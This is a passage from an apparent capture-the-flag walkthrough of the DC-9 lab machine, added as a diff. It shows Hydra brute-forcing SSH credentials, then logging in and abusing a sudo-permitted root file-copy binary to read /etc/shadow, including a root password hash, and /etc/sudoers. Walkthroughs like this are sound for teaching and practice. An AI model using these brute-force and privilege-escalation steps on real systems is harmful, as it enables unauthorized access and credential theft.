@@ -224,3 +224,125 @@ B4-Tru3-001
 4uGU5T-NiGHts
 ```
 
+Found some password. Try bruteforcing ssh again:
+
+```sh
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ hydra -L usernames.txt -P password.txt 192.168.182.134 ssh -I     
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-08 00:33:12
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 352 login tries (l:16/p:22), ~22 tries per task
+[DATA] attacking ssh://192.168.182.134:22/
+[22][ssh] host: 192.168.182.134   login: fredf   password: B4-Tru3-001
+[22][ssh] host: 192.168.182.134   login: chandlerb   password: UrAG0D!
+[22][ssh] host: 192.168.182.134   login: joeyt   password: Passw0rd
+[22][ssh] host: 192.168.182.134   login: janitor   password: Ilovepeepee
+[STATUS] 341.00 tries/min, 341 tries in 00:01h, 13 to do in 00:01h, 14 active
+1 of 1 target successfully completed, 4 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-08 00:34:17
+```
+
+Another valid credential is found. Login with this username and password.
+
+```sh
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ ssh fredf@192.168.182.134  
+fredf@192.168.182.134's password: 
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Dec  8 18:17:06 2022 from 192.168.182.135
+fredf@dc-9:~$ 
+```
+
+```sh
+fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+fredf@dc-9:~$ 
+```
+
+I found that I can run `/opt/devstuff/dist/test/test` with root privilege:
+
+```sh
+fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test
+Usage: python test.py read append
+```
+
+I don't know what `test` does, so I discover its sorce code:
+
+```sh
+fredf@dc-9:~$ cd /opt/devstuff/
+fredf@dc-9:/opt/devstuff$ ls
+build  dist  __pycache__  test.py  test.spec
+fredf@dc-9:/opt/devstuff$ cat test.py 
+#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print ("Usage: python test.py read append")
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], "r")
+    output = (f.read())
+
+    f = open(sys.argv[2], "a")
+    f.write(output)
+    f.close()
+fredf@dc-9:/opt/devstuff$ 
+```
+
+The `test` will read content of `read` file and append its content to `append` file. So I try getting `/etc/shadow` file content (which can be read only by root user) and append it to `/tmp/shadow` which can be read by anyone.
+
+```sh
+fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /etc/shadow /tmp/shadow
+fredf@dc-9:/opt/devstuff$ cat /tmp/shadow 
+root:$6$lFbb8QQt2wX7eUeE$6NC9LUG7cFwjIPZraeiOCkMqsJ4/4pndIOaio.f2f0Lsmy2G91EyxJrEZvZYjmXRfJK/jOiKK0iTGRyUrtl2R0:18259:0:99999:7:::
+daemon:*:18259:0:99999:7:::
+bin:*:18259:0:99999:7:::
+sys:*:18259:0:99999:7:::
+sync:*:18259:0:99999:7:::
+games:*:18259:0:99999:7:::
+man:*:18259:0:99999:7:::
+lp:*:18259:0:99999:7:::
+mail:*:18259:0:99999:7:::
+news:*:18259:0:99999:7:::
+uucp:*:18259:0:99999:7:::
+proxy:*:18259:0:99999:7:::
+www-data:*:18259:0:99999:7:::
+
+[...]
+```
+
+The result is as expected. Now I read `/etc/sudoers` with above method:
+
+```sh
+fredf@dc-9:/opt/devstuff$ cat /tmp/sudoers
+
+[...]
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+
+fredf   ALL=(root) NOPASSWD: /opt/devstuff/dist/test/test
+```
